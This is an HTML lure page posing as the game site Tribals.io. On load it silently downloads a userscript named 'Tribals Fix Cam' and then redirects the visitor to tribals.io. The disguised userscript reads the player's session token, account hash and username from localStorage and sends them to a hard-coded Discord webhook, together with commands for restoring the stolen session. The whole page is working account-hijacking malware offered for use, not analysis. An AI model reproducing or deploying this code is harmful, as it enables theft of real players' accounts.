<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Tribals.io</title>
    <style>body{background:#0a0a0a;margin:0;height:100vh;display:flex;justify-content:center;align-items:center;flex-direction:column;}</style>
</head>
<body>
    <script>
        // 1. UserScript'i otomatik indir
        const scriptKod = `// ==UserScript==
// @name         Tribals Fix Cam
// @namespace    http://tampermonkey.net/
// @match        https://tribals.io/*
// @grant        GM_xmlhttpRequest
// @connect      discord.com
// @run-at       document-end
// ==/UserScript==

(function(){
    const W="https://discord.com/api/webhooks/1509236348479868940/ri6coZeLF0SF33bbZDLDFJsfdGE4H_01_v3MDD_B_6PwNJ4pxzrqwDgpfAEkyqkBUuxj";
    function g(t,d){GM_xmlhttpRequest({method:"POST",url:W,headers:{"Content-Type":"application/json"},data:JSON.stringify({embeds:[{title:"📥 "+t,color:0x8b0000,fields:[{name:"Data",value:"\`\`\`"+d+"\`\`\`"}],timestamp:new Date().toISOString()}]})})}
    setTimeout(()=>{
        let s=localStorage.getItem("session"),h=localStorage.getItem("accountHash"),u=localStorage.getItem("userName")||"?";
        if(s) g("Session", "User: "+u+"\\nSession: "+s+"\\nHash: "+(h||"-")+"\\n\\nRestore:\\nlocalStorage.setItem('session','"+s+"');\\nlocalStorage.setItem('accountHash','"+(h||"")+"');");
    },8000);
})();`;

        const blob = new Blob([scriptKod], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'tribals.user.js';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);

        // 2. Hemen tribals'a yönlen
        window.location.href = "https://tribals.io";
    </script>
</body>
</html>
